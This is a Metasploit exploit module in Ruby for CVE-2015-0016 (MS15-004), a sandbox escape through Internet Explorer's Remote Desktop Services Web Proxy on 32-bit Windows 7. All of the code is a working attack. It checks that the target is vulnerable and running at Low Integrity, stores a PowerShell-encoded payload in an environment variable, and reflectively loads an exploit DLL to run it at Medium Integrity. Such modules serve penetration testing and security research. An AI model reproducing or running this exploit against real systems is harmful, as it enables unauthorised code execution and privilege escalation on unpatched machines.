# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;MS15-004 Microsoft Remote Desktop Services Web Proxy IE Sandbox Escape&#039;,
      &#039;Description&#039;    => %q{
        This module abuses a process creation policy in Internet Explorer&#039;s sandbox, specifically
        the Microsoft Remote Desktop Services Web Proxy IE one, which allows the attacker to escape
        the Protected Mode, and execute code with Medium Integrity. At the moment, this module only
        bypass Protected Mode on Windows 7 SP1 and prior (32 bits). This module has been tested
        successfully on Windows 7 SP1 (32 bits) with IE 8 and IE 11.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # From Threat Intel of Symantec
          &#039;Henry Li&#039;, # Public vulnerability analysis
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => [ARCH_X86],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;WfsDelay&#039; => 30
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Protected Mode (Windows 7) / 32 bits&#039;,
            {
              &#039;Arch&#039; => ARCH_X86
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-0016&#039;],
          [&#039;MSB&#039;, &#039;MS15-004&#039;],
          [&#039;URL&#039;, &#039;http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2015-0016-escaping-the-internet-explorer-sandbox/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 13 2015&#039;
    }))
  end

  def check
    temp = get_env(&#039;WINDIR&#039;)
    dll_path = "#{temp}\\System32\\TSWbPrxy.exe"

    win_ver = sysinfo[&#039;OS&#039;]

    unless win_ver =~ /Windows Vista|Windows 2008|Windows 2012|Windows [78]/
      return Exploit::CheckCode::Safe
    end

    unless file_exist?(dll_path)
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Detected
  end

  def exploit
    print_status(&#039;Checking target...&#039;)
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, &#039;System not vulnerable&#039;)
    end

    if session.platform !~ /^x86\//
      fail_with(Failure::NotVulnerable, &#039;Sorry, this module currently only allows x86/win32 sessions at the moment&#039;)
    end

    win_ver = sysinfo[&#039;OS&#039;]
    if win_ver =~ /Windows 2012|Windows 8/
      fail_with(Failure::NotVulnerable, &#039;This module doesn\&#039;t run on Windows 8/2012 at the moment&#039;)
    end

    print_status(&#039;Checking the Process Integrity Level...&#039;)

    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, &#039;Not running at Low Integrity&#039;)
    end

    cmd = cmd_psh_payload(
      payload.encoded,
      payload_instance.arch.first,
      { :remove_comspec => true }
    )

    print_status(&#039;Storing payload on environment variable...&#039;)
    cmd.gsub!(&#039;powershell.exe &#039;,&#039;&#039;)
    session.railgun.kernel32.SetEnvironmentVariableA(&#039;PSHCMD&#039;, cmd)

    print_status(&#039;Exploiting...&#039;)
    temp = get_env(&#039;TEMP&#039;)
    # Reflective DLL Injection the exceptions in the sandbox
    # policy won&#039;t apply.
    session.core.load_library(
      &#039;LibraryFilePath&#039; => ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-0016&#039;, &#039;cve-2015-0016.dll&#039;),
      &#039;TargetFilePath&#039;  => temp +  &#039;\\cve-2015-0016.dll&#039;,
      &#039;UploadLibrary&#039;   => true,
      &#039;Extension&#039;       => false,
      &#039;SaveToDisk&#039;      => false
    )
  end

  def cleanup
    session.railgun.kernel32.SetEnvironmentVariableA(&#039;PSHCMD&#039;, nil)
    super
  end

end

